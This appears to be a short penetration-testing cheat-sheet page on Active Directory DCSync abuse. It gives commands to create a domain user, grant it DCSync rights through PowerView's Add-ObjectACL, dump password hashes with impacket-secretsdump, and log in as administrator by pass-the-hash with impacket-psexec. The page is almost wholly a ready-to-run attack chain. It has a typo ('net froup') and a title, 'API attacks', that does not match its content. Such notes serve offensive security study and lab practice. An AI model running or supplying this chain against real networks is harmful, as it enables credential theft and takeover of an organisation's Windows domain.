---
layout: default
title: API attacks
permalink: /AD/DCSync/
---

# DCSync
The `WriteDACL` privilege allows a user to add ACLs to an object. We can add users to this group and give them `DCSync` privileges.

# Create a new user
```net user john password123 /add /domain```

# Add user to groups
```net froup "Group Name" john /add```

```net localgroup "Local Group Name" john /add```

# Add DCSync rights
We can use this repository: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```. .\PowerView.ps1```
This is dot-sourcing the PowerView script into the current PowerShell session.

It does not execute the script like a normal script — it loads all functions into memory so you can use them interactively.

Then:
```
$pass = convertto-securestring 'password123' -asplain -force
```
```
$cred =  new-object system.management.automation.pscredential('domain\john', $pass)
```
```
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```
Then run a DCSync attack:
```
impacket-secretsdump domain/john@$ip
```
If we get let's say the administrator hash, then we can access that target:
```
impacket-psexec administrator@$ip -hashes $hash
```
